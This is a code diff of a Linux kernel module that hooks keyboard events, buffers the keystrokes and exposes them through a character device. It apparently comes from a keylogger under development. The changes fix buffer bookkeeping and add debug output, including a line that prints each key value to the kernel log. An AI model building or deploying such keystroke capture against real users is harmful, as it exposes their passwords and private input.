@@ -36,7 +36,7 @@ static unsigned char dev_buffer[BUFFER_LEN];
 static unsigned char* begin = dev_buffer;
 static unsigned char* end = dev_buffer;
 static unsigned char omittedKeys = 0;
-static unsigned short* end = current_size;
+static unsigned short current_size = 0;
 
 #define BUFFER_SIZE current_size
 #define IS_BUFFER_FULL (BUFFER_SIZE == BUFFER_LEN)
@@ -103,6 +103,7 @@ static int log_key(struct notifier_block *nblock, unsigned long code, void *_par
     }
 
     printk(KERN_ALERT "log_key %d\n", (int) (end-begin));
+    printk(KERN_ALERT "key_value %d\n", (int) param->value);
     printk(KERN_ALERT "Bufsize: %d\n", (int) BUFFER_SIZE);
 
     spin_unlock(&lock);
@@ -166,7 +167,9 @@ static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_
 {
     unsigned short bytes_read;
     spin_lock(&lock);
+
     printk(KERN_ALERT "read: start\n");
+    printk(KERN_ALERT "empty: %d\n", IS_BUFFER_EMPTY);
 
     while (IS_BUFFER_EMPTY)
     {
@@ -178,7 +181,7 @@ static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_
     printk(KERN_ALERT "read: reading...\n");
 
     /* copy data from the kernel data segment to the user data segment */
-    for (bytes_read = 0; begin != end && bytes_read <= length; ++bytes_read, --current_size)
+    for (bytes_read = 0; current_size > 0 && bytes_read < length; ++bytes_read, --current_size)
     {
         put_user(*(begin++), buffer++);
         if (begin == dev_buffer + BUFFER_LEN)
